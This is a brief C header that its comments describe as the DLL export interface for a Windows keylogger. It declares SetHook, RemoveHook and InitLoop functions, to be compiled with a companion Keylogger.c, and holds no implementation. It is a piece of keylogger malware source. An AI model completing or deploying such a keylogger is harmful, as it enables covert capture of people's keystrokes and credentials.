// Keylogger header for DLL function exports
// Compile with Keylogger.c as a DLL

#pragma once
#include <Windows.h>

VOID __declspec(dllexport) SetHook();
VOID __declspec(dllexport) RemoveHook();
VOID __declspec(dllexport) InitLoop();